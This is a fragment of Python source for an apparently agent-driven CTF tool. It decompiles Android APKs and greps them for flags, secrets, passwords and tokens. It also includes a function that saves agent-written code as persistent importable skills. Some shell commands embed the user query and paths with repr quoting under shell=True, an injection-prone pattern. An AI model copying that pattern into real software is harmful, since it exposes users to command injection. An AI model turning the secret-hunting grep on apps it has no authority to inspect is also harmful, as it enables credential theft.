            out.append("[jadx not installed] Install: apt install jadx  OR  snap install jadx")
            out.append("Falling back to dex2jar + procyon...")
            if shutil.which("d2j-dex2jar"):
                jar_out = "/tmp/ctf_apk_classes.jar"
                subprocess.run(["d2j-dex2jar", apk_path, "-o", jar_out],
                               capture_output=True, timeout=60)
                out.append(f"JAR created at {jar_out} — decompile with: procyon {jar_out}")
            return "\n".join(out)

        out_dir = output_dir or f"/tmp/jadx_{os.path.basename(apk_path).replace('.apk','')}"
        if not os.path.isdir(out_dir):
            res = subprocess.run(["jadx", "-d", out_dir, apk_path],
                                 capture_output=True, text=True, timeout=120)
            if res.returncode != 0:
                out.append(f"[jadx error] {res.stderr[:400]}")
                return "\n".join(out)
        out.append(f"Decompiled to: {out_dir}")
        # Show package structure
        res = subprocess.run(f"find {out_dir!r} -name '*.java' | head -30",
                             shell=True, capture_output=True, text=True)
        out.append("[Java source files]\n" + (res.stdout or "(none)"))
        # Quick grep for interesting things
        res2 = subprocess.run(
            f"grep -rn --include='*.java' -iE 'flag|secret|password|key|token|decrypt|encode' {out_dir!r} | head -30",
            shell=True, capture_output=True, text=True, timeout=20,
        )
        if res2.stdout.strip():
            out.append("\n[Interesting code hits]\n" + res2.stdout)

    elif action == "search":
        if not query:
            return "[android_analyze] search requires a query string."
        out_dir = f"/tmp/jadx_{os.path.basename(apk_path).replace('.apk','')}"
        if not os.path.isdir(out_dir):
            out.append(f"[decompile first] Run action=decompile to create {out_dir}")
            return "\n".join(out)
        res = subprocess.run(
            f"grep -rn --include='*.java' -E {query!r} {out_dir!r} | head -50",
            shell=True, capture_output=True, text=True, timeout=20,
        )
        out.append(res.stdout or f"(no matches for '{query}')")

    else:
        out.append("[unknown action] Use: decompile, manifest, permissions, strings, search")

    return "\n".join(out)


def _save_skill(name: str, description: str, code: str, session) -> str:
    from pathlib import Path
    import re
    # Validate and clean module name
    clean_name = re.sub(r'[^a-zA-Z0-9_]', '_', name.replace('.py', ''))
    if not clean_name:
        return "[save_skill] ERROR: Invalid name."
        
    skills_dir = Path("/home/work/ctf-tool-enset/data/agent_skills")
    skills_dir.mkdir(parents=True, exist_ok=True)
    
    # Ensure __init__.py exists
    (skills_dir / "__init__.py").touch(exist_ok=True)
    
    file_path = skills_dir / f"{clean_name}.py"
    
    # Add docstring dynamically
    header = f'\"\"\"\n{description}\n\"\"\"\n\n'
    if not code.startswith('\"\"\"'):
        code = header + code
        
    file_path.write_text(code, encoding="utf-8")
    
    return (
        f"[save_skill] ✓ Skill '{clean_name}' successfully saved to the persistent library!\n"
        f"In all future Python scripts (including shell_exec), you can use it like this:\n"
        f"from agent_skills.{clean_name} import ...\n"
    )

